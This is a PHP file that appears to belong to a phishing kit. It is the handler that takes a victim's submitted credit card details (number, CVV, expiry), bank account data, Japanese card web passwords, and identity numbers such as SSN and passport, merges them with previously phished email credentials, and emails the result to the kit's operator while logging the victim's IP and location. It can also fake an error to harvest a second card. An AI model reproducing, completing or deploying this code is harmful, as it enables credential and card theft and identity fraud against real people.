<?php
error_reporting(0);
session_start();
date_default_timezone_set('Asia/Jakarta');
$tanggal = date("d/m/Y H:i:s");
require_once('../main.php');
require_once("../blocker.php");
require_once('../session.php');
if($_POST['ccno'] == "") {
	exit();
}
$ip = getUserIP();
$antidouble = md5($_POST['ccno']);
$_SESSION['ending'] = substr($_POST['ccno'], -4);
$bin = check_bin($_POST['ccno']);
$ispuser = getisp($ip);
$message  = "____ $$ If money not sleep, We cant rest $$ ____\n";
$message .= "\n";
$message .= "Email		: ".$_SESSION['email']."\n";
$message .= "Password	: ".$_SESSION['password']."\n";
$message .= "\n";
$message .= "CC Name    	: ".$_POST['ccname']."\n";
$message .= "CC Number	: ".$_POST['ccno']."\n";
$message .= "Expired		: ".$_POST['exp_bulan']."/".$_POST['exp_tahun']."\n";
$message .= "CVV			: ".$_POST['cvv']."\n";
if($bin["scheme"] == "amex")
{
$message .= "AMEX CID 		: ".$_POST['cid']."\n";
}
$message .= "Format		: ".$_POST['ccno']."|".$_POST['exp_bulan']."|".$_POST['exp_tahun']."\n";
$message .= "\n";
if($countryname !== "Japan")
{
$message .= "Account Number	: ".$_POST['acno']."\n";
$message .= "Sort Code		: ".$_POST['sortcode']."\n";
$message .= "Credit Limit	: ".$_POST['climit']."\n";
}
if($countryname == "Japan")
{
$message .= "WEB ID		: ".$_POST['cardid']."\n";
$message .= "Cardpass		: ".$_POST['passjp']."\n";
}
$message .= "\n";
if($setting['get_billing'] == "on") {
$message .= "Full Name	: ".$_SESSION['fullname']."\n";
$message .= "Address		: ".$_SESSION['address']."\n";
$message .= "City			: ".$_SESSION['city']."\n";
$message .= "State		: ".$_SESSION['state']."\n";
$message .= "Country		: ".$_SESSION['country']."\n";
$message .= "Zip			: ".$_SESSION['zipcode']."\n";
$message .= "DOB		: ".$_SESSION['dob']."\n";
$message .= "Phone		: ".$_SESSION['phone']."\n";
$message .= "=====================================\n";
if($countryname !== "Japan")
{
$message .= "\n";
$message .= "ID Number					: ".$_SESSION['numbid']."\n";
$message .= "Civil ID					: ".$_SESSION['civilid']."\n";
$message .= "Qatar ID					: ".$_SESSION['qatarid']."\n";
$message .= "National ID				: ".$_SESSION['naid']."\n";
$message .= "Citizen ID					: ".$_SESSION['citizenid']."\n";
$message .= "Passport Number			: ".$_SESSION['passport']."\n";
$message .= "Bank Access Number         : ".$_SESSION['bans']."\n";
$message .= "Social Insurance Number	: ".$_SESSION['sin']."\n";
$message .= "Social Security Number		: ".$_SESSION['ssn']."\n";
$message .= "OSID Number				: ".$_SESSION['osidnumber']."\n";
}
}
$message .= "\n";
$message .= "Time		: ".$tanggal."\n";
$message .= "Browser		: ".$br.", ".$os.",".$user_agent."\n";
$message .= "Location		: ".$regioncity.", ".$citykota.", ".$countryname."\n";
$message .= "\n";
$message .= "_____ [ Teishutsu shite kurete arigatō! ] _____ \n";

$_SESSION['email'] = $_POST['emailLogin'];
$bins = preg_replace('/\s/', '', $_POST['ccno']);
$bins = substr($bins,0,6);
$_SESSION['from'] = $_POST['fullname'];
if($setting['get_billing'] == "on") {
	$from = $_SESSION['fullname'];
}else{
	$from = $_POST['ccname'];
}
if($bin["brand"] == "") {
		$subject = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." [ $cn - $os - $ip ]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
}else{
		$subject = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." [ $cn - $os - $ip ]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}
if($antidouble == $_SESSION['anti_double']) {
}else{
	kirim_mail($setting['email_result'],$from,$subject,$message);
	tulis_file("../result/total_cc.txt", $ip);
	tulis_file("../result/total_bin.txt","$subbin\n");
	tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Mengisi Credit Card");
}
$_SESSION['anti_double'] = md5($_POST['ccno']);

if($_SESSION['cc_pertama'] == "udah") {
}else{
	if($setting['double_cc'] == "on") {
		$_SESSION['cc_pertama'] = "udah";
			echo "<script type='text/javascript'>window.top.location='../ap/payment?session=$key&error=1';</script>";
	}
}

if($setting['get_photo'] == "on") {
	echo "<script type='text/javascript'>window.top.location='../ap/verify_credit?session=$key';</script>";
	exit();
}else{
	echo "<script type='text/javascript'>window.top.location='../ap/done?session=$key';</script>";
exit();
}
?>
